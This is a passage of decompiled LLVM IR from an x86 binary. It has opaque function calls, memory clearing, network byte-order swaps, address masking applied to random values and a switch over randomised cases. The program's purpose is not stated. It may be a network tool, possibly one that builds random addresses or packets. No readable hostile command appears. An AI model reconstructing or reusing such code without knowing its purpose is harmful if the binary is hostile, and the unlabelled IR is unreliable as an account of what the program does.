  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8214, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be215, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_804f5b0(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_804ec60(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_804ec60(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_804ec60(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_804ec60(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_804ec60(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_804ec60(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_804ec60(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_804ec60(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_804ec60(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_804ec60(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_804ec60(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_8050c58(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp136 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp136, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d5 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d5, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d5 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_804f5d0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_804f5b0(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_80500b3(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_804f5d0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_804f5d0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_804f5d0(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp238 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp238, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v1_8048463 = call i32 @function_804e440(i32 %v1_804839d5)
  store i32 %v1_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp242 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp242, 0
  br i1 %v4_8048478, label %bb137, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp242 to i32
  %v5_8048478 = lshr i32 %v1_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v1_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb137
  %v1_804848a = call i32 @function_804e440(i32 %v1_804839d5)
  %v2_804848a = sext i32 %v1_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v1_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v2_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_804fe12(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp138 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp138, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
